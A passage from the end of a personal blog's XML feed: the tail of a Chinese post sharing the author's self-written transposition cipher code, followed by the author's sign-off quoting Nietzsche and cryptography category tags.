class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>以上就是我自己编写的置换密码的源码，水平有限，难免会有错误，恳请读者谅解并指正。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="密码学" scheme="http://wlfsky.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="http://wlfsky.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
</feed>
